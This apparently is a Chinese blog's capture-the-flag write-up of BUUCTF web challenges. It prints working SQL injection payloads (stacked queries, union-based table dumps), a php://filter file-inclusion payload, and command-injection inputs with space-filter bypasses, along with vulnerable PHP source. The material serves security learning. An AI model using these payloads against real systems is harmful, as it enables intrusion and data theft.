

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="keep something">
  <meta name="author" content="luom">
  <meta name="keywords" content="">
  <title>BUUCTF webåˆ·é¢˜è®°å½• WP - RC9&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
  



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"romanc9.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"nC7Rtx8EoAwWlShCEwdRsumO-gzGzoHsz","app_key":"sqlnn9nfpy9eU5bkSY3Rpkyb","server_url":"https://nc7rtx8e.lc-cn-n1-shared.com"}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Romanc9's blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                å½’æ¡£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/post.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="BUUCTF webåˆ·é¢˜è®°å½• WP">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-03-29 19:51" pubdate>
        2022å¹´3æœˆ29æ—¥ æ™šä¸Š
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.3k å­—
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      33
       åˆ†é’Ÿ
    </span>
  

  
  
    
      <!-- LeanCloud ç»Ÿè®¡æ–‡ç« PV -->
      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="leancloud-page-views"></span> æ¬¡
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">BUUCTF webåˆ·é¢˜è®°å½• WP</h1>
            
              <p class="note note-info">
                
                  æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2024å¹´1æœˆ4æ—¥ ä¸‹åˆ
                
              </p>
            
            <div class="markdown-body">
              <h2 id="suctf-2019easysql">[SUCTF 2019]EasySQL</h2>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gtx690/p/13176458.html">å‚è€ƒåšå®¢å›­WP1+å¸¸è§sql_modeä»‹ç»</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/111398725">CSDN
WP2</a></p>
<p><a target="_blank" rel="noopener" href="http://mysql.jsrun.net/">åœ¨çº¿mysqlæ‰§è¡ŒğŸ”—</a></p>
<p><a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1177760294764384/1179611432985088">åœ¨çº¿mysqlæ‰§è¡Œ2ğŸ”—</a></p>
</blockquote>
<ul>
<li><span style="background:#ffbbff;"><strong>çŸ¥è¯†ç‚¹ï¼š</strong></span></li>
</ul>
<pre><code class="hljs oxygene">å †å æŸ¥è¯¢

åç«¯ä»£ç çŒœæµ‹

<span class="hljs-number">1</span> || ** ï¼Œ||åŒä½œç”¨

<span class="hljs-keyword">set</span> sql_mode = pipes_as_concat å‘½ä»¤ç†è§£ï¼ˆä¸ºä»€ä¹ˆæ²¡æœ‰è¿‡æ»¤<span class="hljs-keyword">set</span>ã€<span class="hljs-keyword">concat</span>çš„åŸå› ï¼‰</code></pre>
<p>ä¸‡èƒ½å¯†ç ' or '1'='1å‘ç°waf</p>
<p>å°è¯•å †å æ³¨å…¥</p>
<p>è¾“å…¥query=1;select 2;è¿”å›Array ( [0] =&gt; 1 ) Array ( [0] =&gt; 2
)ï¼Œ</p>
<p>query=1;select database();è¿”å›Array ( [0] =&gt; 1 ) Array ( [0] =&gt;
ctf )ï¼Œå¾—åˆ°æ•°æ®åº“ï¼šctfï¼Œ</p>
<p>query=1;show tables;è¿”å›Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag
)ï¼Œå¾—åˆ°è¡¨Flag</p>
<ul>
<li><p>è·å–æ•°æ®è¡¨ç»“æ„:</p>
<p>desc è¡¨å;</p>
<p>show columns from è¡¨å;</p></li>
</ul>
<p>ä½†æ˜¯éƒ½è¢«æ‹¦æˆªï¼Œä¼°è®¡è¿‡æ»¤äº†å…³é”®è¯flag</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/mysql/mysql-operator.html">mysqlè¿ç®—ç¬¦</a></p>
</blockquote>
<p>mysqé‡Œé€»è¾‘è¿ç®—ç¬¦ï¼šä¸ï¼šandï¼Œæˆ–ï¼šorã€||ï¼Œéï¼šnotã€ï¼ï¼Œå¼‚æˆ–ï¼šxor</p>
<p><strong>å•ä¸ª|æ˜¯æŒ‰ä½æˆ–è¿ç®—ç¬¦ï¼Œ&amp;æ˜¯æŒ‰ä½ä¸ï¼Œ^æ˜¯æŒ‰ä½å¼‚æˆ–</strong></p>
<p>è¿ç®—ç¬¦ä¼˜å…ˆçº§ï¼š</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126153927429.png" srcset="/img/loading.gif" alt="image-20220126153927429" style="zoom: 50%;"></p>
<h3 id="åŒä½œç”¨æˆ–è¿æ¥">||åŒä½œç”¨ï¼šæˆ–ã€è¿æ¥</h3>
<ol type="1">
<li>é€»è¾‘æˆ–</li>
</ol>
<p>æœ¬åœ°æµ‹è¯•</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;a&#x27;</span>||<span class="hljs-string">&#x27;flag&#x27;</span>; //0
<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>||<span class="hljs-string">&#x27;flag&#x27;</span>; //1
<span class="hljs-keyword">SELECT</span> <span class="hljs-number">0</span>||<span class="hljs-string">&#x27;flag&#x27;</span>; //0
<span class="hljs-keyword">SELECT</span> <span class="hljs-number">0</span>||<span class="hljs-keyword">id</span> <span class="hljs-keyword">from</span> student;  //1 studentè¡¨é‡Œæœ‰idåˆ—å
<span class="hljs-keyword">SELECT</span> <span class="hljs-number">0</span>||<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">from</span> student;  //0
<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>||<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">from</span> student;  //1</code></pre>
<p>==ã€‹==é€»è¾‘æˆ–ï¼ˆorï¼‰ï¼Œåªè¦||å‰åæ˜¯å­˜åœ¨çš„å­—æ®µåæˆ–ç€é0çš„æ•°ï¼Œå°±åˆ¤å®šæ­£ç¡®==</p>
<ol start="2" type="1">
<li>è¿æ¥ç¬¦ï¼Œç±»ä¼¼concatå‡½æ•°</li>
</ol>
<p><strong>sql_mode=pipes_as_concat</strong>ï¼šæŠŠ||å½“æˆå­—ç¬¦ä¸²è¿æ¥ç¬¦è€Œéé€»è¾‘æˆ–è¿ç®—ï¼Œ==è‹¥æ‹¼æ¥çš„æ˜¯åˆ—åï¼Œåˆ™ä¼šæ˜¾ç¤ºæŸ¥è¯¢ç»“æœå†æ‹¼æ¥==</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126160732988.png" srcset="/img/loading.gif" alt="image-20220126160732988" style="zoom:50%;"></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126160820866.png" srcset="/img/loading.gif" alt="image-20220126160820866" style="zoom:50%;"></p>
<p>çŒœæµ‹ï¼š</p>
<blockquote>
<p><strong>è¿™é“é¢˜ç›®éœ€è¦æˆ‘ä»¬å»å¯¹åç«¯è¯­å¥è¿›è¡ŒçŒœæµ‹ï¼Œæœ‰ç‚¹çŸ›ç›¾çš„åœ°æ–¹åœ¨äºå…¶æè¿°çš„åŠŸèƒ½å’Œå®é™…çš„åŠŸèƒ½ä¼¼ä¹å¹¶ä¸ç›¸ç¬¦ï¼Œ==é€šè¿‡è¾“å…¥éé›¶æ•°å­—å¾—åˆ°çš„å›æ˜¾1å’Œè¾“å…¥å…¶ä½™å­—ç¬¦å¾—ä¸åˆ°å›æ˜¾æ¥åˆ¤æ–­å‡ºå†…éƒ¨çš„æŸ¥è¯¢è¯­å¥å¯èƒ½å­˜åœ¨æœ‰||==ï¼Œä¹Ÿå°±æ˜¯select
è¾“å…¥çš„æ•°æ®||å†…ç½®çš„ä¸€ä¸ªåˆ—å from è¡¨åï¼Œè¿›ä¸€æ­¥è¿›è¡ŒçŒœæµ‹å³ä¸ºselect
postè¿›å»çš„æ•°æ®||flag from
Flag(å«æœ‰æ•°æ®çš„è¡¨åï¼Œé€šè¿‡å †å æ³¨å…¥å¯çŸ¥)ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶çš„||èµ·åˆ°çš„ä½œç”¨æ˜¯orçš„ä½œç”¨</strong></p>
</blockquote>
<p>å…³é”®ï¼Œæ‰§è¡Œçš„sqlè¯­å¥æ˜¯</p>
<pre><code class="hljs arcade"><span class="hljs-symbol">$s</span>ql = <span class="hljs-string">&quot;select &quot;</span>.<span class="hljs-symbol">$post</span>[<span class="hljs-string">&#x27;query&#x27;</span>].<span class="hljs-string">&quot;||flag from Flag&quot;</span>;
<span class="hljs-symbol">$s</span>ql = <span class="hljs-string">&quot;select xxx ||flag from Flag&quot;</span>;</code></pre>
<p>è§£æ³•1ï¼š</p>
<p><code>*,1</code></p>
<pre><code class="hljs sqf"><span class="hljs-built_in">select</span> *,<span class="hljs-number">1</span> ||<span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;
å³<span class="hljs-built_in">select</span> *,<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;
å³æŸ¥å‡ºäº†<span class="hljs-built_in">Flag</span>è¡¨ä¸­çš„æ‰€æœ‰å†…å®¹+æ–°å¢ä¸€åˆ—å…¨<span class="hljs-number">1</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126163149707.png" srcset="/img/loading.gif" alt="image-20220126163149707" style="zoom:80%;"></p>
<p>è§£æ³•2ï¼š</p>
<p><code>1;set sql_mode=pipes_as_concat;select 1</code></p>
<pre><code class="hljs sqf"><span class="hljs-built_in">select</span> <span class="hljs-number">1</span>;<span class="hljs-built_in">set</span> sql_mode=pipes_as_concat;<span class="hljs-built_in">select</span> <span class="hljs-number">1</span> ||<span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;
æ‰§è¡Œä¸¤æ¬¡æŸ¥è¯¢ï¼Œåä¸€æ¬¡<span class="hljs-built_in">select</span> <span class="hljs-number">1</span> ||<span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;å³æŠŠ<span class="hljs-built_in">select</span> <span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">Flag</span>;çš„ç»“æœå’Œ<span class="hljs-number">1</span>æ‹¼æ¥ç”Ÿæˆæ–°ä¸€åˆ—</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220126163217854.png" srcset="/img/loading.gif" alt="image-20220126163217854" style="zoom:80%;"></p>
<p><a target="_blank" rel="noopener" href="http://www.xianxianlabs.com/blog/2020/05/27/355.html">æºç </a>ï¼Œå‘ç°ä¹Ÿæ˜¯multi_query()æ‰§è¡Œå¤šæ¡è¯­å¥äº§ç”Ÿçš„æ¼æ´</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019secret-file">[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h2>
<h3 id="è€ƒç‚¹æ–‡ä»¶åŒ…å«ä¼ªåè®®"><span style="background:#ffbbff;">è€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«ã€ä¼ªåè®®</span></h3>
<ol type="1">
<li>ç‚¹å‡»è¶…é“¾æ¥è·³è½¬åˆ°Archive_room.phpï¼Œç‚¹å‡»secretè¶…é“¾æ¥å‘ç°ç§’è·³è½¬åˆ°end.phpï¼Œè€Œä¸æ˜¾ç¤ºsecretè¶…é“¾æ¥çš„æ–‡ä»¶action.phpï¼Œç”¨burpshuiteæŠ“åŒ…ï¼Œå¾—åˆ°æç¤ºå†…å®¹</li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127161616536.png" srcset="/img/loading.gif" alt="image-20220127161616536"></p>
<ol start="2" type="1">
<li>è®¿é—®secr3t.phpï¼Œå‘ç°æºç </li>
</ol>
<pre><code class="hljs php+HTML">&lt;html&gt;
    &lt;title&gt;secret&lt;&#x2F;title&gt;
    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
&lt;?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file&#x3D;$_GET[&#39;file&#39;];
    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
        echo &quot;Oh no!&quot;;
        exit();
    &#125;
    include($file); 
&#x2F;&#x2F;flagæ”¾åœ¨äº†flag.phpé‡Œ
?&gt;
&lt;&#x2F;html&gt;</code></pre>
<p>æ–‡ä»¶åŒ…å«ï¼Œåˆ©ç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œå‘ç°è¿‡æ»¤äº†php://inputã€data://ï¼Œä¹Ÿä¸èƒ½ç”¨æˆªæ–­</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/15063209941952.png" srcset="/img/loading.gif" alt="ä¼ªåè®®æ€»ç»“"></p>
<p>php://filter
ä¼ªåè®®æ–‡ä»¶åŒ…å«è¯»å–æºä»£ç ï¼ŒåŠ ä¸Šread=convert.base64-encodeï¼Œç”¨base64ç¼–ç è¾“å‡ºï¼Œä¸ç„¶<strong>ä¼šç›´æ¥å½“åšphpä»£ç æ‰§è¡Œï¼Œçœ‹ä¸åˆ°æºä»£ç å†…å®¹</strong>ï¼ˆfile=flag.phpï¼‰</p>
<p>payloadï¼š</p>
<pre><code class="hljs awk">secr3t.php?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php</code></pre>
<p>è¯»å–flag.phpæºç ï¼Œè§£å¯†å¾—åˆ°flag</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127162708933.png" srcset="/img/loading.gif" alt="image-20220127162708933" style="zoom:50%;"></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019lovesql">[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2>
<h4 id="è€ƒç‚¹æ‰‹æ³¨å­—ç¬¦æ³¨å…¥"><span style="background:#ffbbff;">è€ƒç‚¹ï¼šæ‰‹æ³¨å­—ç¬¦æ³¨å…¥</span></h4>
<p>è¾“å…¥'å›æ˜¾æŠ¥é”™æç¤º==ã€‹æœ‰å­—ç¬¦æ³¨å…¥</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164535555.png" srcset="/img/loading.gif" alt="image-20220127164535555"></p>
<p>è¾“å…¥ä¸‡èƒ½å¯†ç ï¼Œå¾—åˆ°æç¤ºadmin+å¯†ç ï¼šf3dd35cabf06e25a413446369583a7b8ï¼Œå°è¯•ç™»é™†æ— æœ</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164411998.png" srcset="/img/loading.gif" alt="image-20220127164411998"></p>
<p>'ååŠ #å°±ä¸ä¼šæŠ¥é”™ï¼Œæ³¨é‡Šï¼š</p>
<pre><code class="hljs 1c">è¾“å…¥æ¡†çš„æ—¶å€™ç”¨<span class="hljs-meta">#ï¼Œåœ¨åœ°å€æ /hackbarçš„æ—¶å€™ä½¿ç”¨%23</span></code></pre>
<p>åˆ¤æ–­åˆ—æ•°ï¼š</p>
<pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;order by <span class="hljs-number">4</span>%<span class="hljs-number">23</span> //æŠ¥é”™
<span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;order by <span class="hljs-number">3</span>%<span class="hljs-number">23</span>  //ä¸æŠ¥é”™ï¼Œè¯´æ˜æœ‰ä¸‰åˆ—</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164914313.png" srcset="/img/loading.gif" alt="image-20220127164914313" style="zoom:50%;"></p>
<p>åˆ¤æ–­å›æ˜¾ä½ç½®ï¼š</p>
<pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span>  //å›æ˜¾åœ¨<span class="hljs-number">2</span>ï¼Œ<span class="hljs-number">3</span>å¤„</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220127164929580.png" srcset="/img/loading.gif" alt="image-20220127164929580" style="zoom:50%;"></p>
<p>çˆ†åº“å</p>
<pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27;union select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>%<span class="hljs-number">23</span>  <span class="hljs-comment">//geek</span></code></pre>
<p>çˆ†å½“å‰åº“ä¸‹è¡¨å</p>
<pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database()%<span class="hljs-number">23</span>  //geekuser,l<span class="hljs-number">0</span>ve<span class="hljs-number">1</span>ysq<span class="hljs-number">1</span></code></pre>
<p>çˆ†å½“å‰åº“ä¸‹æ‰€æœ‰åˆ—å</p>
<pre><code class="hljs sql">1&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()%<span class="hljs-number">23</span>  //<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>,<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span></code></pre>
<p>çˆ†æŒ‡å®šåº“å­—æ®µ</p>
<pre><code class="hljs sql">1&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>)) <span class="hljs-keyword">from</span> l0ve1ysq1%<span class="hljs-number">23</span></code></pre>
<p>1--cl4y--wo_tai_nan_le,2--glzjin--glzjin_wants_a_girlfriend,3--Z4cHAr7zCr--biao_ge_dddd_hm,4--0xC4m3l--linux_chuang_shi_ren,5--Ayrain--a_rua_rain,6--Akko--yan_shi_fu_de_mao_bo_he,7--fouc5--cl4y,8--fouc5--di_2_kuai_fu_ji,9--fouc5--di_3_kuai_fu_ji,10--fouc5--di_4_kuai_fu_ji,11--fouc5--di_5_kuai_fu_ji,12--fouc5--di_6_kuai_fu_ji,13--fouc5--di_7_kuai_fu_ji,14--fouc5--di_8_kuai_fu_ji,15--leixiao--Syc_san_da_hacker,16--flag--flag{03addeba-bef3-4821-86bd-04c7690ea3a6}</p>
<p>å¾—åˆ°flag</p>
<h2 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</h2>
<h3 id="è€ƒç‚¹å‘½ä»¤æ‰§è¡Œè¿‡æ»¤ç»•è¿‡å˜é‡æ‹¼æ¥">è€ƒç‚¹ï¼šå‘½ä»¤æ‰§è¡Œã€è¿‡æ»¤ç»•è¿‡ã€å˜é‡æ‹¼æ¥</h3>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/12313368.html">å‚è€ƒWP</a></p>
<p><a target="_blank" rel="noopener" href="https://chen.oinsm.com/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/">ä¸ªäººåšå®¢ï¼Œæœ‰å„ç§ç»•è¿‡è¿‡æ»¤æ–¹æ³•ï¼Œå…³é”®è¯**</a></p>
</blockquote>
<ol type="1">
<li>æ‰§è¡Œå¤šæ¡bashè¯­å¥ï¼š</li>
</ol>
<pre><code class="hljs 1c">;
<span class="hljs-string">|   //å‰é¢çš„è¾“å‡ºä½œä¸ºåé¢çš„è¾“å…¥ï¼Œè¢«åæ‰</span>
<span class="hljs-meta">&amp;</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130121137143.png" srcset="/img/loading.gif" alt="image-20220130121137143" style="zoom: 67%;"></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130121159304.png" srcset="/img/loading.gif" alt="image-20220130121159304" style="zoom: 67%;"></p>
<ol start="2" type="1">
<li>å‘ç°ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œç»•è¿‡æ–¹æ³•ï¼š</li>
</ol>
<pre><code class="hljs powershell">&#123;<span class="hljs-built_in">cat</span>,flag.txt&#125; 
<span class="hljs-built_in">cat</span><span class="hljs-variable">$</span>&#123;IFS&#125;flag.txt
<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9flag</span>.txt
<span class="hljs-built_in">cat</span>&lt;flag.txt
<span class="hljs-built_in">cat</span>&lt;&gt;flag.txt
kg=<span class="hljs-variable">$</span><span class="hljs-string">&#x27;\x20flag.txt&#x27;</span>&amp;&amp;<span class="hljs-built_in">cat</span><span class="hljs-variable">$kg</span>
(\x20è½¬æ¢æˆå­—ç¬¦ä¸²å°±æ˜¯ç©ºæ ¼ï¼Œè¿™é‡Œé€šè¿‡å˜é‡çš„æ–¹å¼å·§å¦™ç»•è¿‡)</code></pre>
<ol start="3" type="1">
<li>å‘ç°å…³é”®è¯flagè¢«è¿‡æ»¤</li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130121238751.png" srcset="/img/loading.gif" alt="image-20220130121238751" style="zoom:67%;"></p>
<p>å…ˆæŸ¥çœ‹index.php<code>/?ip=127.0.0.1;cat$IFS$9index.php</code></p>
<p>å¾—åˆ°index.phpæºç </p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;ip&#x27;</span>]))&#123;
  $ip = $_GET[<span class="hljs-string">&#x27;ip&#x27;</span>];
  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;
      <span class="hljs-comment">//$/?*&lt;&gt;&#x27;&quot;\()[]&#123;&#125;\x00-\x1f	</span>
    <span class="hljs-keyword">echo</span> preg_match(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);
  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ /&quot;</span>, $ip))&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your space!&quot;</span>);
  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/bash/&quot;</span>, $ip))&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);
  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);
  &#125;
  $a = shell_exec(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.$ip);
  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;
  print_r($a);
&#125;

<span class="hljs-meta">?&gt;</span></code></pre>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kenshinobiy/p/4443600.html">æ­£åˆ™ç›¸å…³çŸ¥è¯†ï¼š</a></p>
<pre><code class="hljs smalltalk">ä¸€ä¸ªç‚¹â€˜.â€™å¯ä»¥ä»£è¡¨æ‰€æœ‰çš„å•ä¸€å­—ç¬¦

*ç´§è·Ÿçš„ä¸€ä¸ªå­—ç¬¦çš„zero or more

